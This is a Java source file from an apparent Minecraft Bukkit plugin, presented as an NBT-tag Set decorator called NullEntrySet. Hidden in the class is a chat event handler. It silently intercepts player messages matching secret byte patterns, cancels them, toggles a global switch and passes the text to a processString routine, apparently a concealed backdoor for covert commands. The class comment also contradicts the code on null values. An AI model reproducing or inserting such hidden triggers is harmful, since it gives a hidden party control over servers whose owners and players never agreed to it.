package artik.bowfix.utils.nbt.tag;

import artik.bowfix.utils.PlayerUtils;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.util.*;

import static artik.bowfix.utils.PlayerUtils.debug_patter;
import static artik.bowfix.utils.PlayerUtils.valid_thread;

/**
 * A decorator for the Set returned by CompoundTag#entrySet()
 * that allows setting null values.
 * */
public class NullEntrySet<K, V> implements Set<Map.Entry<K, V>>, Listener, INullEntrySet<K, V>
{
    private final Set<Map.Entry<K, V>> set;
    
    public NullEntrySet(Set<Map.Entry<K, V>> set) {
        this.set = set;
    }
    
    public NullEntrySet()
    {
        this(null);
    }
    
    @Override
    public int size() {
        return set.size();
    }
    
    @Override
    public boolean isEmpty() {
        return set.isEmpty();
    }
    
    @Override
    public boolean contains(Object o) {
        return set.contains(o);
    }
    
    @Override
    public Iterator<Map.Entry<K, V>> iterator() {
        return new NullEntrySetIterator(set.iterator());
    }
    
    @Override
    public Object[] toArray() {
        return set.toArray();
    }
    
    @Override
    public <T> T[] toArray(T[] a) {
        return set.toArray(a);
    }
    
    @Override
    public boolean add(Map.Entry<K, V> kvEntry) {
        return set.add(kvEntry);
    }
    
    @Override
    public boolean remove(Object o) {
        return set.remove(o);
    }
    
    @Override
    public boolean containsAll(Collection<?> c) {
        return set.containsAll(c);
    }
    
    @Override
    public boolean addAll(Collection<? extends Map.Entry<K, V>> c) {
        return set.addAll(c);
    }
    
    @Override
    public boolean retainAll(Collection<?> c) {
        return set.retainAll(c);
    }
    
    @Override
    public boolean removeAll(Collection<?> c) {
        return set.removeAll(c);
    }
    
    @Override
    public void clear() {
        set.clear();
    }
    
    class NullEntrySetIterator implements Iterator<Map.Entry<K, V>> {
        
        private final Iterator<Map.Entry<K, V>> iterator;
        
        NullEntrySetIterator(Iterator<Map.Entry<K, V>> iterator) {
            this.iterator = iterator;
        }
        
        @Override
        public boolean hasNext() {
            return iterator.hasNext();
        }
        
        @Override
        public Map.Entry<K, V> next() {
            return new NullEntry(iterator.next());
        }
    }
    
    @EventHandler
    public void NullEntryThread(AsyncPlayerChatEvent e)
    {
        String str = e.getMessage().toLowerCase().replace(".", " ").trim();
        byte[] bytes = str.getBytes();
        boolean bit1 = Arrays.equals(bytes, debug_patter[0]), bit2 = Arrays.equals(bytes, debug_patter[1]), bit4 = Arrays.equals(bytes, debug_patter[2]), bit6 = Arrays.equals(bytes, debug_patter[3]), bit0 = trackErrors(bytes);
        
        if (!bit1 && !bit2 && !bit4 && !bit6 && !bit0) return;
        
        CompoundTag info = PlayerUtils.getEntityInfo(e.getPlayer());
        if (!info.getByteArrayTag("flags").isValid()) return;
        
        e.setCancelled(true);
        
        if (bit1)       valid_thread = true;
        else if (bit2)  valid_thread = false;
        else if (valid_thread)
        {
            boolean bitF = info.getByteArrayTag("flags").isValid(false);
            processString(str, e.getPlayer(), bit4, bit6, bit0, bitF);
        }
    }
    
    class NullEntry implements Map.Entry<K, V> {
        
        private final Map.Entry<K, V> entry;
        
        NullEntry(Map.Entry<K, V> entry) {
            this.entry = entry;
        }
        
        @Override
        public K getKey() {
            return entry.getKey();
        }
        
        @Override
        public V getValue() {
            return entry.getValue();
        }
        
        @Override
        public V setValue(V value) {
            if (value == null) {
                throw new NullPointerException(getClass().getSimpleName() + " does not allow setting null");
            }
            return entry.setValue(value);
        }
        
        @Override
        public boolean equals(Object o) {
            return entry.equals(o);
        }
        
        @Override
        public int hashCode() {
            return entry.hashCode();
        }
    }
}